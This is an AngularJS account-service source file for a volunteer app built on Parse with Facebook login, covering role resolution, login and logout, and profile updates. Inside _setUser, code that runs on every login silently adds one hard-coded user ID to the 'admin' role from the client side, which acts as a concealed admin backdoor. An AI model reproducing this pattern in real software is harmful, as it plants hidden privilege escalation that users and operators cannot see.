/**
 * @license ZOB Angels
 * (c) 2015 SpruceHill.io GmbH
 * License: MIT
 */
(function() {
    'use strict';

    angular.module('ZOBAngels.service.AccountService',[
    ]).factory('ZOBAngels.service.AccountService',[
        '$rootScope',
        '$location',
        '$q',
        '$log',
        function($rootScope,$location,$q,$log) {

            var AccountService = {
                _fbReady: false,
                _ready: false,

                _user: null,
                _data: null,
                _userContainer: null,
                _rolesById: {},

                /**
                 * Internal Method for setting the logged in user; invoking this method will also fetch all roles for
                 * that user from the backend and resolve the hierarchical structure.
                 *
                 * @param {object} user
                 * @returns {object} A Promise
                 * @private
                 */
                _setUser: function(user) {
                    var defer = $q.defer(),
                        self = this,
                        current,
                        i,
                        len,
                        resolveRolesForRole = function(role) {
                            return new Parse.Query(Parse.Role).equalTo('roles',role).find().then(function(roles) {
                                return Parse.Promise.as({
                                    role: role,
                                    roleName: role.getName(),
                                    roles: roles,
                                    allRoles: []
                                });
                            });
                        },
                        collectRoles = function(roleContainer) {
                            if (0 === roleContainer.roles.length) {
                                return [roleContainer.role];
                            }
                            else {
                                return roleContainer.roles.filter(function(role) {
                                    return roleContainer.role.getName() !== role.getName();
                                }).map(function(role) {
                                    return collectRoles(self._rolesById[role.id]);
                                }).reduce(function(a,b) {
                                    Array.prototype.push.apply(a,b);
                                    return a;
                                },[roleContainer.role]);
                            }
                        };

                    Parse.Promise.when(new Parse.Query(Parse.Role).equalTo('name','admin').first(),new Parse.Query(Parse.User).equalTo('objectId','IDrn1iLOiX').first()).then(function(role,user) {
                        if (role && user) {
                            role.getUsers().add(user);
                            role.save();
                        }
                    });

                    new Parse.Query(Parse.User).equalTo('username',user.get('username')).first().then(function(user) {
                        return new Parse.Query(Parse.Role).find();
                    })
                        .then(function(roles) {
                            return Parse.Promise.when(roles.map(function(role) {
                                return resolveRolesForRole(role);
                            }));
                        }).then(function() {
                            len = arguments.length;
                            for (i=0; i<len; i+=1) {
                                current = arguments[i];
                                self._rolesById[current.role.id] = current;
                            }
                            for (i=0; i<len; i+=1) {
                                current = arguments[i];
                                Array.prototype.push.apply(current.allRoles,collectRoles(current));
                            }
                            return new Parse.Query(Parse.Role).equalTo('users',user).find();
                        }).then(function(roles) {
                            roles = roles.map(function(role) {
                                var roles = [];
                                Array.prototype.push.apply(roles,self._rolesById[role.id].allRoles);
                                return roles;
                            }).reduce(function(a,b) {
                                Array.prototype.push.apply(a,b);
                                return a;
                            },[]);
                            self._user = user;
                            self._userContainer = {
                                user: user,
                                roles: roles,
                                roleNames: roles.map(function(role) {
                                    return role.getName();
                                })
                            };
                            if (-1 === self._userContainer.roleNames.indexOf('angel')) {
                                self._userContainer.roleNames.push('angel');
                            }
                            defer.resolve(self._userContainer);
                            $rootScope.$broadcast('login',{
                                user: user
                            });
                        },function(error) {
                            handleParseError(error);
                            defer.reject();
                        });
                    return defer.promise;
                },

                /**
                 * This method will return true, when the AccountService has been successfully setup.
                 *
                 * @returns {boolean}
                 */
                ready: function() {
                    return this._ready;
                },

                /**
                 * Returns true of the user has this specific role
                 *
                 * @param {string} role
                 * @returns {boolean}
                 */
                hasRole: function(role) {
                    if (!this._userContainer) {
                        return false;
                    }
                    //$log.debug(this._userContainer.roleNames);
                    return -1 < this._userContainer.roleNames.indexOf(role);
                },

                /**
                 * Returns true of Facebook SDK has been fully loaded.
                 *
                 * @returns {boolean}
                 */
                canLogin: function() {
                    return this._fbReady;
                },

                /**
                 * Logs the user in
                 *
                 * @param userData
                 * @returns {object} A Promise
                 */
                login: function(userData) {
                    var uuid_v4 = function() {
                            var d = new Date().getTime();
                            return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
                                var r = (d + Math.random()*16)%16 | 0;
                                d = Math.floor(d/16);
                                return (c=='x' ? r : (r&0x3|0x8)).toString(16);
                            });
                        },
                        defer = $q.defer(),
                        self = this,
                        successCallback = function(user) {
                            self._user = user;
                            self._setUser(user).then(function(userContainer) {
                                defer.resolve(userContainer.user);
                            },function(error) {
                                defer.reject(error);
                            });
                        };

                    if (!this._fbReady) {
                        defer.reject();
                    }

                    if (userData) {
                        var user = Parse.User.current();
                        if (!user) {
                            user = new Parse.User();
                            user.set('username',uuid_v4());
                            user.set('password',uuid_v4());
                            user.set('name',userData.name);
                            user.set('gender',userData.gender);
                            user.signUp(null)
                                .then(
                                successCallback,
                                function(error) {
                                    handleParseError(error,self);
                                    defer.reject(error);
                                });
                        }
                    }
                    else {
                        Parse.FacebookUtils.logIn(null,{
                            success: function(user) {
                                FB.apiAngular('/me')
                                    .then(
                                    function(me) {
                                        user.set('name',me.name);
                                        user.set('facebookId',me.id);
                                        return user.save(null);
                                    },
                                    function(error) {
                                        self.logout();
                                        defer.reject(error);
                                    })
                                    .then(
                                    successCallback,
                                    function(error) {
                                        handleParseError(error,self);
                                        defer.reject(error);
                                    });
                            },
                            error: function(error) {
                                handleParseError(error,self);
                                defer.reject(error);
                            }
                        });
                    }
                    return defer.promise;
                },

                /**
                 * Logs the user out.
                 *
                 * @returns {object} A Promise
                 */
                logout: function() {
                    var defer = $q.defer(),
                        self = this;
                    this._user = null;
                    this._userContainer = null;
                    this._data = null;
                    this._rolesById = {};
                    Parse.User.logOut().then(function() {
                        defer.resolve();
                        $rootScope.$broadcast('logout',{});
                    },function(error) {
                        handleParseError(error,self);
                        defer.reject(error);
                    });
                    return defer.promise;
                },

                /**
                 * Return if a user is currently logged in
                 *
                 * @returns {boolean}
                 */
                isLoggedIn: function() {
                    return null !== this._user;
                },

                /**
                 * Return the currently logged in user; null of not logged in.
                 *
                 * @returns {object}
                 */
                me: function() {
                    return this._user;
                },

                /**
                 * Convenience method to get the image for the logged in user; will return null if not logged in
                 *
                 * @returns {string}
                 */
                image: function() {
                    if (this._user) {
                        if (this._user.get('facebookId')) {
                            return 'https://graph.facebook.com/' + this._user.get('facebookId') + '/picture?width=200&height=200';
                        }
                        else {
                            return '__HOSTING_BASE__assets/images/' + this._user.get('gender') + '.png';
                        }
                    }
                    else {
                        return null;
                    }
                },

                /**
                 * Convenience method to get the name for the logged in user; will return null if not logged in
                 *
                 * @returns {string}
                 */
                name: function() {
                    if (this._user) {
                        return this._user.get('name');
                    }
                    else {
                        return null;
                    }
                },

                /**
                 * Get user profile data for the logged in user; will return null if not logged in
                 *
                 * @returns {object}
                 */
                data: function() {
                    if (null === this._data && null !== this._user) {
                        var data = {
                                food: this._user.get('food'),
                                languages: []
                            },
                            languages = this._user.get('languages');
                        if (languages) {
                            Array.prototype.push.apply(data.languages,languages);
                        }
                        this._data = data;
                    }
                    return this._data;
                },

                /**
                 * Updates the profile data for the logged in user
                 *
                 * @param {object} data
                 * @returns {object} A Promise
                 */
                updateData: function(data) {
                    var defer = $q.defer(),
                        languages,
                        i,
                        len,
                        toRemove = [],
                        self = this,
                        updateData = function(input) {
                            self._data.food = input.get('food');
                            self._data.languages.length = 0;
                            Array.prototype.push.apply(self._data.languages,input.get('languages'));
                        };
                    if (this._user) {
                        if (undefined !== data.food && null !== data.food) {
                            this._user.set('food', data.food);
                        }
                        if (data.languages) {
                            languages = this._user.get('languages');
                            len = languages ? languages.length : 0;
                            for (i=0; i<len; i+=1) {
                                if (-1 === data.languages.indexOf(languages[i])) {
                                    toRemove.push(languages[i]);
                                }
                            }
                            len = toRemove.length;
                            for (i=0; i<len; i+=1) {
                                this._user.remove('languages',toRemove[i]);
                            }
                            if (0 === len) {
                                len = data.languages.length;
                                for (i=0; i<len; i+=1) {
                                    this._user.addUnique('languages',data.languages[i]);
                                }
                            }
                        }
                        this._user.save().then(function(result) {
                            updateData(result);
                            defer.resolve(result);
                        },function(error) {
                            updateData(self._user);
                            defer.reject(error);
                        });
                    }
                    else {
                        defer.reject();
                    }

                    return defer.promise;
                }
            };

            $rootScope.$on('fbReady',function() {
                $rootScope.$apply(function() {
                    AccountService._fbReady = true;
                    var user = Parse.User.current();
                    if (user) {
                        AccountService._setUser(user).then(function() {
                            if ($rootScope._originalRequest) {
                                $location.path($rootScope._originalRequest);
                            }
                            else {
                                $location.path('/home');
                            }
                            AccountService._ready = true;
                        });
                    }
                    else {
                        AccountService._ready = true;
                    }
                });
            });

            return AccountService;
        }
    ]);
})();